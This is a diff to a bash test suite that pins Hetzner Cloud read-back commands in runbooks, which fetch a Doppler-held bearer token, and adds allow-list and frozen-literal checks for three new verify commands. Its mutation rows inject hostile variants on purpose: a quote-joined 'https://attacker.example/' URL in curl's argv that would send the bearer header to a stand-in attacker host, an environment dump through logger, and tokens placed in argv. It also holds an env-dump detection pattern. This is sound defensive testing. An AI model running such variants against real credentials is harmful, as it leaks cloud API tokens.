@@ -2239,6 +2239,7 @@ n3b_census() { # n3b_census <file> <D> <R> <want-D> <want-R>: one awk pass over 
     function flush(   l, p, t) { if (!open) return; open = 0; l = tolower(j); p = pp
       if (p == "" && index(l, "api.hetzner.cloud")) p = "p3"
       if (p == "" && index(l, "hcloud_token") && (index(l, "curl") || index(l, "authorization"))) p = "p4"
+      if (p == "" && (index(j, "$HCLOUD_TOKEN") || index(j, "${HCLOUD_TOKEN") || index(j, "--only-secrets HCLOUD") || index(j, "--only-secrets=HCLOUD") || index(j, "secrets get HCLOUD"))) p = "p5"
       if (p == "") return
       t = j; sub(/^[ \t]+/, "", t)
       if (t == ENVIRON["N3B_D"]) nd++
@@ -2273,13 +2274,33 @@ N3B_EOF
 IFS= read -r -d '' N3B_FROZEN_R <<'N3B_EOF' || true
 doppler run -p soleur -c prd_terraform --only-secrets HCLOUD_TOKEN_READONLY --no-exit-on-missing-only-secrets -- sh -c '[ -n "$HCLOUD_TOKEN_READONLY" ] || { echo missing-token; exit 3; }; r=$(printf "header = \"Authorization: Bearer %s\"\n" "$HCLOUD_TOKEN_READONLY" | curl --disable --noproxy "*" -sS --config - --max-time 30 -w "\n%{http_code}" https://api.hetzner.cloud/v1/volumes/@ID@) || { echo read-failed; exit 2; }; case "$(printf %s "$r" | tail -n 1)" in 200) w=$(printf %s "$r" | sed "\$d" | jq -r "if .volume.protection.delete == true then \"protected\" elif .volume.protection.delete == false then \"not-protected\" else \"read-failed\" end" 2>/dev/null);; 404) w=volume-gone;; *) w=read-failed;; esac; case "$w" in protected) echo protected;; not-protected) echo not-protected; exit 1;; volume-gone) echo volume-gone; exit 4;; *) echo read-failed; exit 2;; esac'
 N3B_EOF
+IFS= read -r -d '' N3B_FROZEN_V2 <<'N3B_EOF' || true
+doppler run -p soleur -c prd_terraform --only-secrets HCLOUD_TOKEN_READONLY --no-exit-on-missing-only-secrets -- sh -c '[ -n "$HCLOUD_TOKEN_READONLY" ] || { echo missing-token; exit 3; }; printf "header = \"Authorization: Bearer %s\"\n" "$HCLOUD_TOKEN_READONLY" | curl --disable --noproxy "*" -sS --config - --max-time 30 https://api.hetzner.cloud/v1/servers/123931471 | jq -c ".server.volumes"'   # expect [@ID@]
+N3B_EOF
+IFS= read -r -d '' N3B_FROZEN_V3 <<'N3B_EOF' || true
+doppler run -p soleur -c prd_terraform --only-secrets HCLOUD_TOKEN_READONLY --no-exit-on-missing-only-secrets -- sh -c '[ -n "$HCLOUD_TOKEN_READONLY" ] || { echo missing-token; exit 3; }; printf "header = \"Authorization: Bearer %s\"\n" "$HCLOUD_TOKEN_READONLY" | curl --disable --noproxy "*" -sS --config - --max-time 30 "https://api.hetzner.cloud/v1/volumes?name=soleur-web-platform-data" | jq -c "[.volumes[].id]"'   # expect []
+N3B_EOF
+IFS= read -r -d '' N3B_FROZEN_V4 <<'N3B_EOF' || true
+doppler run -p soleur -c prd_terraform --only-secrets HCLOUD_TOKEN_READONLY --no-exit-on-missing-only-secrets -- sh -c '[ -n "$HCLOUD_TOKEN_READONLY" ] || { echo missing-token; exit 3; }; printf "header = \"Authorization: Bearer %s\"\n" "$HCLOUD_TOKEN_READONLY" | curl --disable --noproxy "*" -sS --config - --max-time 30 https://api.hetzner.cloud/v1/volumes/@ID@ | jq ".volume.protection.delete"'   # expect true after the SSH-stage apply
+N3B_EOF
 N3B_FROZEN_D=${N3B_FROZEN_D%$'\n'}; N3B_FROZEN_R=${N3B_FROZEN_R%$'\n'}
+N3B_FROZEN_V2=${N3B_FROZEN_V2%$'\n'}; N3B_FROZEN_V3=${N3B_FROZEN_V3%$'\n'}; N3B_FROZEN_V4=${N3B_FROZEN_V4%$'\n'}
 N3B_SRC="$REPO_ROOT/plugins/soleur/test/${BASH_SOURCE[0]##*/}"   # this file, read by n3b_frozen_self
-n3b_frozen_self() { # n3b_frozen_self <suite-file> <D|R>: N3B_FROZEN_<D|R> as written in <suite-file> must be a quoted heredoc whose
-  # body names no RB_HDR, RB_WRAP or rb_line_ and equals the value this shell holds (so nothing in it expanded)
-  local v="N3B_FROZEN_$2" body
+n3b_frozen_self() { # n3b_frozen_self <suite-file> <D|R|V2|V3|V4>: N3B_FROZEN_<key> as written in <suite-file> must be a quoted heredoc
+  # whose body names no RB_HDR, RB_WRAP or rb_line_ and equals the value this shell holds (so nothing in it expanded). @ID@
+  # placement is checked first (CTO concern 2), so the value-equality arm, which fires on any edited copy, cannot mask it:
+  # D, R, V2 and V4 hold exactly one @ID@, V2's sits in `expect [@ID@]` (never in the servers URL), and V3 holds none.
+  local v="N3B_FROZEN_$2" body t n
   body=$(awk -v v="$v" 'f && $0 == "N3B_EOF" { exit } f { print } index($0, "IFS= read -r -d '\'''\'' " v " <<") == 1 { f = 1
     if ($0 != "IFS= read -r -d '\'''\'' " v " <<'\''N3B_EOF'\'' || true") print "@@unquoted@@" }' "$1")
+  if [[ -n "$body" ]]; then
+    t=${body//@ID@/}; n=$(( (${#body} - ${#t}) / 4 ))
+    if [[ "$2" == V3 ]]; then (( n == 0 )) || printf 'builder %s: frozen: @ID@ placement: %s holds %d @ID@, want none\n' "$2" "$v" "$n"
+    else
+      (( n == 1 )) || printf 'builder %s: frozen: @ID@ placement: %s holds %d @ID@, want exactly one\n' "$2" "$v" "$n"
+      [[ "$2" != V2 || "$body" == *'expect [@ID@]'* ]] || printf 'builder %s: frozen: @ID@ placement: %s has no `expect [@ID@]`\n' "$2" "$v"
+    fi
+  fi
   case "$body" in
     '') printf 'builder %s: frozen: no %s heredoc in %s\n' "$2" "$v" "${1##*/}" ;;
     @@unquoted@@*) printf 'builder %s: frozen: %s is not a quoted heredoc (<<'\''N3B_EOF'\'')\n' "$2" "$v" ;;
@@ -2289,13 +2310,18 @@ n3b_frozen_self() { # n3b_frozen_self <suite-file> <D|R>: N3B_FROZEN_<D|R> as wr
 }
 n3b_frozen_all() { # n3b_frozen_all <suite-file>: n3b_frozen_self over every frozen key, so the key list is pinned once (by the fs rows)
   local k
-  for k in D R; do n3b_frozen_self "$1" "$k"; done
+  for k in D R V2 V3 V4; do n3b_frozen_self "$1" "$k"; done
 }
 N3B_SLOTS=('--only-secrets HCLOUD_TOKEN_READONLY ' '[ -n "$HCLOUD_TOKEN_READONLY" ]' 'printf "header = \"Authorization: Bearer %s\"\n" "$HCLOUD_TOKEN_READONLY" | curl ')
 N3B_CRED='(hcloud_token|authoriz|bearer|curl)'
 N3B_ENVDUMP='(^|[^a-z0-9_])(printenv|environ|env|set|export|eval|declare)([^a-z0-9_]|$)'
 N3B_END='^(.*https://api\.hetzner\.cloud/v1/volumes/[0-9]+)['"'"')]'
-n3b_lists() { # n3b_lists <D|R> <which: built|literal> <line>: the four defence-in-depth checks, one `builder <D|R>: <check>:` line each
+# The V kinds' ends (ruling F2): the kind's own URL directly followed by ` | jq `. V2 and V4 are greedy regexes, so they bind the
+# last match; V3 is matched as the fixed string N3B_V3_URL (never a regex or an unquoted glob, where `?` and `.` are wildcards),
+# cut at its LAST occurrence.
+N3B_END_V2='^(.*https://api\.hetzner\.cloud/v1/servers/[0-9]+) [|] jq '
+N3B_END_V4='^(.*https://api\.hetzner\.cloud/v1/volumes/[0-9]+) [|] jq '
+n3b_lists() { # n3b_lists <D|R|V2|V3|V4> <which: built|literal> <line>: the four defence-in-depth checks, one `builder <K>: <check>:` line each
   local k="$1" w="$2" x="$3" r="$3" s t n bad="" a="" seg o v key seen=" " i=0
   local -a ws
   for s in "${N3B_SLOTS[@]}"; do
@@ -2306,12 +2332,31 @@ n3b_lists() { # n3b_lists <D|R> <which: built|literal> <line>: the four defence-
   [[ -z "$bad" ]] || printf 'builder %s: slots: %s: each slot must occur exactly once: %s\n' "$k" "$w" "$bad"
   [[ ! "${r,,}" =~ $N3B_CRED ]] || printf 'builder %s: residual: %s: %s outside the three slots: %s\n' "$k" "$w" "${BASH_REMATCH[1]}" "${r:0:120}"
   [[ "$x" != *'| curl '* ]] || a=${x#*'| curl '}
-  bad=""; if [[ "$a" =~ $N3B_END ]]; then seg=${BASH_REMATCH[1]}; else seg=$a; bad=" (no volume-id end)"; fi
+  bad=""
+  case "$k" in
+    V2) if [[ "$a" =~ $N3B_END_V2 ]]; then seg=${BASH_REMATCH[1]}; else seg=$a; bad=" (no V2 URL end)"; fi ;;
+    V3) if [[ "$a" == *"$N3B_V3_URL | jq "* ]]; then seg=${a%"$N3B_V3_URL | jq "*}$N3B_V3_URL; else seg=$a; bad=" (no V3 URL end)"; fi ;;
+    V4) if [[ "$a" =~ $N3B_END_V4 ]]; then seg=${BASH_REMATCH[1]}; else seg=$a; bad=" (no V4 URL end)"; fi ;;
+    *) if [[ "$a" =~ $N3B_END ]]; then seg=${BASH_REMATCH[1]}; else seg=$a; bad=" (no volume-id end)"; fi ;;
+  esac
   [[ "$seg" != *"''"* && "$seg" != *'""'* ]] || printf 'builder %s: curl-argv: quote-join: %s: two quoted pieces joined in curl argv: %s\n' "$k" "$w" "${seg:0:120}"
   [[ "$seg" != *[\$\`]* ]] || bad+=' $-or-backquote'
   read -ra ws <<<"$seg"
   while (( i < ${#ws[@]} )); do
     o=${ws[i]}; key=$o
+    if [[ "$k" == V* ]]; then   # the V allow-list (F1: no -o, no -w) and only the kind's own URL; a V word never reaches the D/R arms
+        case "$o" in
+          --disable|-sS) ;;
+          --noproxy|--config|--max-time) v=${ws[i + 1]-}; i=$((i + 1))
+            case "$o $v" in '--noproxy "*"'|'--config -'|'--max-time 30') ;; *) bad+=" $o $v" ;; esac ;;
+          *) case "$k:$o" in
+               V2:https://api.hetzner.cloud/v1/servers/*) key=url; [[ "${o#https://api.hetzner.cloud/v1/servers/}" =~ ^[0-9]+$ ]] || bad+=" $o" ;;
+               V3:"$N3B_V3_URL") key=url ;;
+               V4:https://api.hetzner.cloud/v1/volumes/*) key=url; [[ "${o#https://api.hetzner.cloud/v1/volumes/}" =~ ^[0-9]+$ ]] || bad+=" $o" ;;
+               *) bad+=" $o" ;;
+             esac ;;
+        esac
+    else
     case "$o" in
       --disable|-sS) ;;
       --noproxy|--config|--max-time|-o|-w) v=${ws[i + 1]-}; i=$((i + 1))
@@ -2319,13 +2364,14 @@ n3b_lists() { # n3b_lists <D|R> <which: built|literal> <line>: the four defence-
       https://api.hetzner.cloud/v1/volumes/*) key=url; [[ "${o#https://api.hetzner.cloud/v1/volumes/}" =~ ^[0-9]+$ ]] || bad+=" $o" ;;
       *) bad+=" $o" ;;
     esac
+    fi
     [[ "$seen" != *" $key "* ]] || bad+=" $key(twice)"
     seen+="$key "; i=$((i + 1))
   done
   [[ -z "$bad" ]] || printf 'builder %s: curl-argv: %s: not on the allow-list:%s\n' "$k" "$w" "${bad:0:120}"
   [[ ! "${r,,}" =~ $N3B_ENVDUMP ]] || printf 'builder %s: env-dump: %s: the residual names `%s`: %s\n' "$k" "$w" "${BASH_REMATCH[2]}" "${r:0:120}"
 }
-n3b_builder() { # n3b_builder <D|R> <built-line> <frozen-literal> <volume-id>: the frozen equality, then the defence lists on both texts
+n3b_builder() { # n3b_builder <D|R|V2|V3|V4> <built-line> <frozen-literal> <volume-id>: the frozen equality, then the defence lists on both texts
   local k="$1" x="$2" f="${3//@ID@/$4}" i=0
   if [[ "$x" != "$f" ]]; then
     while [[ "${x:i:1}" == "${f:i:1}" ]] && (( i < ${#x} )); do i=$((i + 1)); done
@@ -2333,17 +2379,22 @@ n3b_builder() { # n3b_builder <D|R> <built-line> <frozen-literal> <volume-id>: t
   fi
   n3b_lists "$k" built "$x"; n3b_lists "$k" literal "$f"
 }
-n3b() { # n3b <runbook-6894> <skill> <pin> <retired>: one tagged line per disagreement, then one `seen` line per file
+n3b() { # n3b <runbook-6894> <skill> <pin> <retired> <web1-pin>: one tagged line per disagreement, then one `seen` line per file
   local _d _r _fb
-  if [[ -z "$3" || -z "$4" || "$3" == "$4" ]]; then printf 'slot: pin=%s retired=%s (empty or equal)\n' "$3" "$4"; return; fi
+  if [[ -z "$3" || -z "$4" || "$3" == "$4" || -z "$5" || "$5" == "$3" || "$5" == "$4" ]]; then
+    printf 'slot: pin=%s retired=%s web1=%s (empty or equal)\n' "$3" "$4" "$5"; return
+  fi
   _d=$(rb_line_get404 "$4"); _r=$(rb_line_readback "$3")
   n3b_builder D "$_d" "$N3B_FROZEN_D" "$4"; n3b_builder R "$_r" "$N3B_FROZEN_R" "$3"
+  n3b_builder V2 "$(rb_line_v2 "$5")" "$N3B_FROZEN_V2" "$5"   # runbook 6604's verify lines (#12683): N3 binds them to the runbook
+  n3b_builder V3 "$(rb_line_v3 "$5")" "$N3B_FROZEN_V3" "$5"
+  n3b_builder V4 "$(rb_line_v4 "$5")" "$N3B_FROZEN_V4" "$5"
   _fb=$(destroy_section "$1" | fence1)
   [[ "$_fb" == "$_d" ]] || printf 'destroy-fence: %s: the first fenced block under the destroy read-back heading is not exactly D(%s): [%s]\n' "${1##*/}" "$4" "$(head -c 120 <<<"$_fb")"
   n3b_census "$1" "$_d" "$_r" 1 1
   n3b_census "$2" "$_d" "$_r" 0 1
 }
-_n3b=$(n3b_frozen_self "$N3B_SRC" D; n3b_frozen_self "$N3B_SRC" R; n3b "$RUNBOOK" "$SKILL" "$_pin" "$INNGEST_RETIRED_ID" "$_wpin")
+_n3b=$(n3b_frozen_all "$N3B_SRC"; n3b "$RUNBOOK" "$SKILL" "$_pin" "$INNGEST_RETIRED_ID" "$_wpin")
 _n3b_ok=0   # H18 reads it: a mutation battery over base documents that are already red judges nothing
 if [[ "$_n3b" == "seen ${RUNBOOK##*/}: D=1 R=1"$'\n'"seen SKILL.md: D=0 R=1" ]]; then _n3b_ok=1; pass "N3b every Hetzner-bearer logical line (curl, a token name, Authorization or api.hetzner.cloud; backslash continuations joined) of runbook 6894 and the postmerge skill is one of the two pinned stdin-header texts: runbook 6894 holds the retired-volume GET of $INNGEST_RETIRED_ID once (as the destroy read-back fence) and the section-5c read-back of $_pin once, the skill that read-back once; both pinned lines pass the closed builder check"
 else fail "N3b runbook 6894 / postmerge bearer lines (a command must equal rb_line_get404/rb_line_readback; prose: reword it, never re-wrap it): $(tr '\n' ';' <<<"${_n3b:-no census ran}")"; fi
@@ -2850,30 +2901,31 @@ _h18_bld() { # _h18_bld <label> <want> <built|both> <var> <value>: n3b on the re
   H18_RUN=$((H18_RUN + 1))
   local o
   o=$(printf -v "$4" '%s' "$5"
-    if [[ "$3" == both ]]; then N3B_FROZEN_D=$(rb_line_get404 @ID@); N3B_FROZEN_R=$(rb_line_readback @ID@); fi
+    if [[ "$3" == both ]]; then N3B_FROZEN_D=$(rb_line_get404 @ID@); N3B_FROZEN_R=$(rb_line_readback @ID@)
+      N3B_FROZEN_V2=$(rb_line_v2 @ID@); N3B_FROZEN_V3=$(rb_line_v3 @ID@); N3B_FROZEN_V4=$(rb_line_v4 @ID@); fi
     n3b "$RUNBOOK" "$SKILL" "$_pin" "$INNGEST_RETIRED_ID" "$_wpin" | _h18_red)
   [[ "$o" == "$2" ]] || _h18+=" uncaught:$1(${o:-none})"
 }
-_h18_bld g1r14 'D:curl-argv D:frozen D:residual R:curl-argv R:frozen R:residual' built RB_HDR "${RB_HDR/--max-time 30 /--max-time 30 -H \"Authorization: Bearer \$HCLOUD_TOKEN_READONLY\" }"
+_h18_bld g1r14 'D:curl-argv D:frozen D:residual R:curl-argv R:frozen R:residual'"$(_h18_v curl-argv frozen residual)" built RB_HDR "${RB_HDR/--max-time 30 /--max-time 30 -H \"Authorization: Bearer \$HCLOUD_TOKEN_READONLY\" }"
 # Frozen-literal rows (CTO ruling 12a): each change is to the builders alone, invisible to every word list, and must red frozen:
 # m1 a command before the token test, m2 another printf, m3 a second URL quote-joined into curl's argv, m4 a quote-joined -v,
 # m5 the shell's trace flag. m3 and m4 also red curl-argv: quote-join.
-_h18_bld g1m1 'D:frozen R:frozen' built RB_WRAP "${RB_WRAP/"sh -c '[ -n"/"sh -c 'nice [ -n"}"
-_h18_bld g1m2 'D:frozen R:frozen' built RB_HDR "/usr/bin/$RB_HDR"
-_h18_bld g1m3 'D:curl-argv D:curl-argv:quote-join D:frozen R:curl-argv R:curl-argv:quote-join R:frozen' built RB_HDR "${RB_HDR}''https://attacker.example/ "
-_h18_bld g1m4 'D:curl-argv D:curl-argv:quote-join D:frozen R:curl-argv R:curl-argv:quote-join R:frozen' built RB_HDR "${RB_HDR}''-v "
-_h18_bld g1m5 'D:frozen R:frozen' built RB_WRAP "${RB_WRAP/sh -c/sh -xc}"
+_h18_bld g1m1 'D:frozen R:frozen'"$(_h18_v frozen)" built RB_WRAP "${RB_WRAP/"sh -c '[ -n"/"sh -c 'nice [ -n"}"
+_h18_bld g1m2 'D:frozen R:frozen'"$(_h18_v frozen)" built RB_HDR "/usr/bin/$RB_HDR"
+_h18_bld g1m3 'D:curl-argv D:curl-argv:quote-join D:frozen R:curl-argv R:curl-argv:quote-join R:frozen'"$(_h18_v curl-argv curl-argv:quote-join frozen)" built RB_HDR "${RB_HDR}''https://attacker.example/ "
+_h18_bld g1m4 'D:curl-argv D:curl-argv:quote-join D:frozen R:curl-argv R:curl-argv:quote-join R:frozen'"$(_h18_v curl-argv curl-argv:quote-join frozen)" built RB_HDR "${RB_HDR}''-v "
+_h18_bld g1m5 'D:frozen R:frozen'"$(_h18_v frozen)" built RB_WRAP "${RB_WRAP/sh -c/sh -xc}"
 # Defence-list rows (CTO rulings 11c, 12a): each change is made to the builders AND the literal, so frozen holds and one list
 # check alone catches it (g1b1-g1b4); then the shapes the old denylist let through (g1b5 the --user ":$T" row the ruling
 # names); g1b9 a quote-join in an edited literal (it always leaves a word off the allow-list too).
-_h18_bld g1b1 'D:slots R:slots' both RB_WRAP "${RB_WRAP/--only-secrets HCLOUD_TOKEN_READONLY /}"
-_h18_bld g1b2 'D:residual R:residual' both RB_HDR "curl -sS --oauth2-bearer \"\$HCLOUD_TOKEN_READONLY\" https://api.hetzner.cloud/v1/volumes; $RB_HDR"
-_h18_bld g1b3 'D:curl-argv R:curl-argv' both RB_HDR "${RB_HDR}--url-query v=1 "
-_h18_bld g1b4 'D:env-dump R:env-dump' both RB_WRAP "${RB_WRAP}logger \"\$(env)\"; "
-_h18_bld g1b5 'D:curl-argv R:curl-argv' both RB_HDR "${RB_HDR}--user \":\$T\" "
-_h18_bld g1b6 'D:curl-argv D:residual R:curl-argv R:residual' both RB_HDR "${RB_HDR}--user \":\$HCLOUD_TOKEN_READONLY\" "
-_h18_bld g1b7 'D:residual R:residual' both RB_WRAP "${RB_WRAP}T=\$HCLOUD_TOKEN_READONLY; "
-_h18_bld g1b9 'D:curl-argv D:curl-argv:quote-join R:curl-argv R:curl-argv:quote-join' both RB_HDR "${RB_HDR%--max-time 30 }--max-time ''30 "
+_h18_bld g1b1 'D:slots R:slots'"$(_h18_v slots)" both RB_WRAP "${RB_WRAP/--only-secrets HCLOUD_TOKEN_READONLY /}"
+_h18_bld g1b2 'D:residual R:residual'"$(_h18_v residual)" both RB_HDR "curl -sS --oauth2-bearer \"\$HCLOUD_TOKEN_READONLY\" https://api.hetzner.cloud/v1/volumes; $RB_HDR"
+_h18_bld g1b3 'D:curl-argv R:curl-argv'"$(_h18_v curl-argv)" both RB_HDR "${RB_HDR}--url-query v=1 "
+_h18_bld g1b4 'D:env-dump R:env-dump'"$(_h18_v env-dump)" both RB_WRAP "${RB_WRAP}logger \"\$(env)\"; "
+_h18_bld g1b5 'D:curl-argv R:curl-argv'"$(_h18_v curl-argv)" both RB_HDR "${RB_HDR}--user \":\$T\" "
+_h18_bld g1b6 'D:curl-argv D:residual R:curl-argv R:residual'"$(_h18_v curl-argv residual)" both RB_HDR "${RB_HDR}--user \":\$HCLOUD_TOKEN_READONLY\" "
+_h18_bld g1b7 'D:residual R:residual'"$(_h18_v residual)" both RB_WRAP "${RB_WRAP}T=\$HCLOUD_TOKEN_READONLY; "
+_h18_bld g1b9 'D:curl-argv D:curl-argv:quote-join R:curl-argv R:curl-argv:quote-join'"$(_h18_v curl-argv curl-argv:quote-join)" both RB_HDR "${RB_HDR%--max-time 30 }--max-time ''30 "
 # g1b8 changes rb_line_readback alone (n3b calls it with $_pin, so the override returns the real R for $_pin plus an argv credential)
 _h18o=$(rb_line_readback() { printf '%s\n' "${_h18_r/--max-time 30 /--max-time 30 -u \":\$T\" }"; }
   n3b "$RUNBOOK" "$SKILL" "$_pin" "$INNGEST_RETIRED_ID" "$_wpin" | _h18_red)
@@ -2950,7 +3002,7 @@ _h18_fs fs-r-unquoted 'index($0, "IFS= read -r -d '"''"' N3B_FROZEN_R <<") == 1 
 _h18_fs fs-v4-unquoted 'index($0, "IFS= read -r -d '"''"' N3B_FROZEN_V4 <<") == 1 { sub(/<<'"'"'N3B_EOF'"'"'/, "<<N3B_EOF") } { print }' V4 'is not a quoted heredoc'
 _h18_fs fs-v3-id 'p { $0 = $0 "@ID@"; p = 0 } index($0, "IFS= read -r -d '"''"' N3B_FROZEN_V3 <<") == 1 { p = 1 } { print }' V3 '@ID@ placement:'
 _h18_fs fs-v2-url 'p { sub(/servers\/123931471/, "servers/@ID@"); p = 0 } index($0, "IFS= read -r -d '"''"' N3B_FROZEN_V2 <<") == 1 { p = 1 } { print }' V2 '@ID@ placement:'
-[[ -z "$(n3b_frozen_self "$N3B_SRC" D; n3b_frozen_self "$N3B_SRC" R)" ]] || _h18+=" spurious:fs-self"
+[[ -z "$(n3b_frozen_all "$N3B_SRC")" ]] || _h18+=" spurious:fs-self"
 # Logical-line rows (CTO ruling 11b), each named at its START line: g1r15 a token on a continuation line, the URL from a variable
 # (no physical line pairs the words, and no line names the host); g1r16 the host split inside its quotes across a `\` continuation.
 _h18_at() { # _h18_at <label> <line>: the copy's one line number holding exactly <line>, or 0
